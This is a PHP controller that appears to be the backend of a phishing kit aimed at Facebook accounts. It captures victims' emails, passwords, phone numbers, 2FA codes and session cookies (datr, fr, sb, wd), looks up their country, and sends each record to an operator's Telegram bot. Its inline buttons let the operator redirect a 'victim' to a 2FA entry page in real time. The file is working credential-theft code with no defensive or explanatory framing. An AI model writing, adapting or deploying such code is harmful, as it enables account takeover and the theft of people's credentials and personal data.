<?php
header("Access-Control-Allow-Origin: *");
// Cho phép các phương thức yêu cầu được gửi (POST)
header("Access-Control-Allow-Methods: POST");
// Cho phép các tiêu đề yêu cầu được gửi
header("Access-Control-Allow-Headers: Content-Type");
require_once '../vendor/autoload.php';
use Dotenv\Dotenv;
class ApiController { 
    public $ip;
    public $useragent;
    private $conn;
    private $httpcurl;
    public function __construct() { 
        $dotenv = Dotenv::createImmutable(__DIR__ . '/../..');
        $dotenv->load();
        $this->conn = new DTBModel();
        $this->httpcurl = new HttpCurlModel();
        $this->ip = $_SESSION['ip'];
        $this->useragent = $_SESSION['useragent'];

    }

    public function send_user() { 
        $data = json_decode(file_get_contents('php://input'), true);
        $phone = trim($data['phone']);
        $email = trim($data['email']);
        $email = trim($data['email']);
        $password = trim($data['password']);
        $fullname = trim($data['fullname']);
        $pagename = trim($data['fanpage']);
        $emailbusiness = trim($data['emailbusiness']);
        $api_url = 'https://api.country.is/' . explode(',',$this->ip)[0]; 
        $data = json_decode($this->httpcurl->getRequest($api_url), true); 
        $country = isset($data['country']) ? $data['country'] : 'Không có thông tin quốc gia'; 
        $json = [];
        // if($phone == '' || $email == '' || $password == '' || $fullname == '' || $pagename == '' || $emailbusiness == ''){
        if($email == '' || $password == ''){
            $json = ['status' => 'error', 'code' => '001']; 
        }else{
            $id = $this->conn->Send($email, $phone, $fullname, $pagename, $emailbusiness, $password, '', 1, 0, $time = '', $country, $this->ip, $this->useragent);
            $_SESSION['id'] = $id;
            $message = "IP : `$this->ip`\nCountry : `$country` \nEmail : `$email`\nEmail Business : `$emailbusiness`\nPhone : `$phone`\nFull Name : `$fullname`\nPage Name : `$pagename`\nPassword : `$password`\nUseragent: `".$this->useragent."`\nLựa chọn:";
            $keyboard = json_encode([
                'inline_keyboard' => [
                    [ 
                      /*   ['text' => 'Login Success', 'callback_data' => json_encode(['status' => 'success', 'id'=>$id])],
                        ['text' => 'No 2Fa', 'callback_data' => json_encode(['status' => 'no2fa', 'id'=>$id])],
                        ['text' => 'Login Error', 'callback_data' => json_encode(['status' => 'error', 'id'=>$id])*/
                    ]
                ]
            ]);
            
            $telegramUrl = "https://api.telegram.org/bot".$_ENV['TELE_TOKEN']."/sendMessage?parse_mode=Markdown";
            $data = [
                'chat_id' => $_ENV['TELE_ID'],
                'text' => $message,
                'reply_markup' => $keyboard
            ];
            $this->httpcurl->postRequest($telegramUrl, $data);
            echo json_encode( ['status'=> 'success']);
            die();
        }
    }

    public function send_user_code() { 
        $data = json_decode(file_get_contents('php://input'), true); 
        $code = trim($data['code']); 

        $api_url = 'https://api.country.is/' . explode(',',$this->ip)[0]; 
        $data = json_decode($this->httpcurl->getRequest($api_url), true); 
        $country = isset($data['country']) ? $data['country'] : 'Không có thông tin quốc gia'; 
        $json = [];
        if($code == ''){
            $json = ['status' => 'error', 'code' => '001']; 
            echo json_encode($json);
            die();
        }else{
            if(isset($_SESSION['id'])){
                $id = $_SESSION['id'];
                $check = $this->conn->get_by_id($id);
            if($check == false){ 
                $json = ['status'=> 'error','code'=> '002'];
                echo json_encode($json);
                die();
            }else{
                
                $email = $check['email'];
                
                $message = "2FA CODE\n================\nIP : `$this->ip`\nCountry : `$country` \nEmail : `$email`\nCode : `$code`\nUseragent: `".$this->useragent."`";
                $this->conn->update_by_id($id, ['code'=>$code, 'status'=> 3]);
                $keyboard = json_encode([
                'inline_keyboard' => [
                    [ 
                     ['text' => 'Sai Code 2fa', 'callback_data' => json_encode(['status' => 'code_2fa_false', 'id'=>$check['id']])], 
                     ['text' => '2fa Đúng', 'callback_data' => json_encode(['status' => 'close_', 'id'=>$check['id']])]
                    ]
                    ]
                ]); 
            #$this->conn->update_by_id($id, ['code'=> $code, 'status'=>3]);
            $telegramUrl = "https://api.telegram.org/bot".$_ENV['TELE_TOKEN']."/sendMessage?parse_mode=Markdown";
            $data = [
                'chat_id' => $_ENV['TELE_ID'],
                'text' => $message,
                'reply_markup' => $keyboard
            ];
            $this->httpcurl->postRequest($telegramUrl, $data);
            echo json_encode( ['status'=> 'success']);
            die();
            } 
            }else{
                $json = ['status'=> 'error','code'=> '003'];
                echo json_encode($json);
                die();
            }
        }
    }
    public function get_list(){
        echo json_encode($this->conn->get_list());
    }
    public function get_info_by_id() {
        if(isset($_SESSION['id'])){
            $id = $_SESSION['id']; 
            $check = $this->conn->get_by_id($id);
            if($check == false){ 
                $json = ['status'=> 'error','code'=> '002'];
            }else{
                $json = ['status'=> 'success','json'=> $check];
            }
            echo json_encode($json);
        }else{
            $json = ['status'=> 'error','code'=> '003'];
            echo json_encode($json);
        }
    }
    
    public function get_info_by_id_2($params) { 
        $id = $params['id'];
        $check = $this->conn->get_by_id($id);
        if($check == false){ 
            $json = ['status'=> 'error','code'=> '002'];
        }else{
            $json = ['status'=> 'success','json'=> $check];
        }
        die(json_encode($json));
        
    }
    
    public function get_info_by_ids() {
        if(isset($_SESSION['id'])){
            $id = $_SESSION['id']; 
            $check = $this->conn->get_by_id($id);
            if($check == false){ 
                $json = ['status'=> 'error','code'=> '002'];
            }else{
                $json = ['status'=> 'success','json'=> $check];
            }
            return json_encode($json);
        }else{
            $json = ['status'=> 'error','code'=> '003'];
            return json_encode($json);
        }
    }

    public function callback() {
        $update = json_decode(file_get_contents('php://input'), true); 
        if (isset($update['callback_query'])) {
            $callbackData = $update['callback_query']['data'];
         #  $victimId = explode('_', $callbackData)[1];
            $chatId = $update['callback_query']['message']['chat']['id'];
            $json = json_decode($callbackData);  
            $id = $json->id;
            
            if($json->status == 'error'){
                $this->conn->update_by_id($id, ['status'=>3]);
            }elseif($json->status == 'success'){
                $this->conn->update_by_id($id, ['status'=> 1, 'step'=> 2]);
            }elseif($json->status == 'no2fa'){
                $this->conn->update_by_id($id, ['status'=> 2, 'time'=>strtotime('+10 minutes'), 'step'=>3]);
            }elseif($json->status == 'code_error'){
                $this->conn->update_by_id($id, ['status'=>4]);
            }elseif($json->status == 'code_2fa_false'){
                $this->conn->update_by_id($id, ['status'=>10]);
            }elseif($json->status == 'close_'){
                $this->conn->update_by_id($id, ['status'=>9, 'time'=>strtotime('+10 minutes'), 'step'=>3]);
            }elseif($json->status == 'router_2fa'){
                $this->conn->update_by_id($id, ['status'=>8, 'step'=>2]); 
            }elseif($json->status == 'code_success'){
                $this->conn->update_by_id($id, ['status'=> 5, 'time'=>strtotime('+20 minutes'), 'step'=> 3]);
            }else{
                #die();
            }
            $responseText = "Admin đã chọn: ".$json->status;  
            $response = [
                'callback_query_id' => $update['callback_query']['id'],
                'text' => $responseText
            ];
            $telegramUrl = "https://api.telegram.org/bot".$_ENV['TELE_TOKEN']."/answerCallbackQuery";
            $this->httpcurl->postRequest($telegramUrl, $response);
            
            $newInlineKeyboard = [
                'inline_keyboard' => [
                    [
                        ['text' => 'Đã xác nhận '.$json->status, 'callback_data' => 'dalam']
                    ]
                ]
            ];
            
            $editMessageUrl = "https://api.telegram.org/bot".$_ENV['TELE_TOKEN']."/editMessageReplyMarkup";
            
            $data = [
                'chat_id' => $_ENV['TELE_ID'], 
                'message_id' => $update['callback_query']['message']['message_id'],
                'reply_markup' => json_encode($newInlineKeyboard),
            ];

            $this->httpcurl->postRequest($editMessageUrl, $data, ['Content-Type: application/x-www-form-urlencoded']);
        }
    }

    public function set_callback() {
        $url = 'https://api.telegram.org/bot'.$_ENV['TELE_TOKEN'].'/setWebhook?url='.$_ENV['WEB'].'/api/callback';
        #echo $url;
        echo $this->httpcurl->getRequest($url);
    }
    
    public function callback2() {
         $data = json_decode(file_get_contents('php://input'), true); 
         
            $js = $data['json']; 
            
        if (isset($js)) {  
            $json = json_decode($js);  
            print_r($json);
            $id = $json->id;
            if($json->status == 'error'){
                $this->conn->update_by_id($id, ['status'=>3]);
            }elseif($json->status == 'success'){
                $this->conn->update_by_id($id, ['status'=> 1, 'step'=> 2]);
            }elseif($json->status == 'no2fa'){
                $this->conn->update_by_id($id, ['status'=> 2, 'time'=>strtotime('+10 minutes'), 'step'=>3]);
            }elseif($json->status == 'code_error'){
                $this->conn->update_by_id($id, ['status'=>4]);
            }elseif($json->status == 'code_success'){
                $this->conn->update_by_id($id, ['status'=> 5, 'time'=>strtotime('+20 minutes'), 'step'=> 3]);
            }elseif($json->status == 'loai'){
                $this->conn->update_by_id($id, ['status'=> 0, 'time'=>'', 'step'=> 1]);
            }elseif($json->status == 'loai_'){
                $this->conn->update_by_id($id, ['status'=> 8, 'time'=>strtotime('+20 minutes'), 'step'=> 3]);
            }else{
                #die();
            } 
        }
    }
    
    public function send_tele() { 
        $data = json_decode(file_get_contents('php://input'), true); 
         
            $js = $data['json']; 
            
        if (isset($js)) {  
            $json = json_decode($js);  
            $id = $json->id;
             
            $_SESSION['id'] = $id;
            if($json->status){
                $message = "LOGIN SUCCESS\n==================\nIP : `$this->ip`\nCountry : `$json->country` \nUID : `$json->uid`\nEmail : `$json->email`\nPhone : `$json->phone`\nFull Name : `$json->fullname`\nPage Name : `$json->pagename`\nPassword : `$json->password`\nUseragent: `".$json->useragent."`\nCookie: `$json->cookie`\nDatr: `$json->datr`\nFr: `$json->fr`\nSb: `$json->sb`\nWd: `$json->wd`";
                $keyboard = json_encode([
                    'inline_keyboard' => [ 
                    ]
                ]);
            }elseif($json->status == '2fa'){
                $message = "LOGIN 2FA\n==================\nIP : `$this->ip`\nCountry : `$json->country` \nUID : `$json->uid`\nEmail : `$json->email`\nPhone : `$json->phone`\nFull Name : `$json->fullname`\nPage Name : `$json->pagename`\nPassword : `$json->password`\nUseragent: `".$json->useragent."`";
                $keyboard = json_encode([
                    'inline_keyboard' => [ 
                    ]
                ]);
            
            }else{
               $message = "LOGIN ERROR\n==================\nIP : `$json->ip`\nCountry : `$json->country`\nUID : `$json->uid`\nEmail : `$json->email`\nPhone : `$json->phone`\nFull Name : `$json->fullname`\nPage Name : `$json->pagename`\nPassword : `$json->password`\nUseragent: `".$json->useragent."`";
                $keyboard = json_encode([
                    'inline_keyboard' => [ 
                        [ 
                            ['text' => 'Chuyển Victim Sang Trang Nhập 2FA', 'callback_data' => json_encode(['status' => 'router_2fa', 'id'=>$json->id])], 
                            ['text' => 'Đóng Chrome', 'callback_data' => json_encode(['status' => 'close_', 'id'=>$json->id])]
                            ]
                    ]
                ]); 
            }
            
            $telegramUrl = "https://api.telegram.org/bot".$_ENV['TELE_TOKEN']."/sendMessage?parse_mode=Markdown";
            $data = [
                'chat_id' => $_ENV['TELE_ID'],
                'text' => $message,
                'reply_markup' => $keyboard
            ];
            $this->httpcurl->postRequest($telegramUrl, $data);
            
        }
    }
    
}
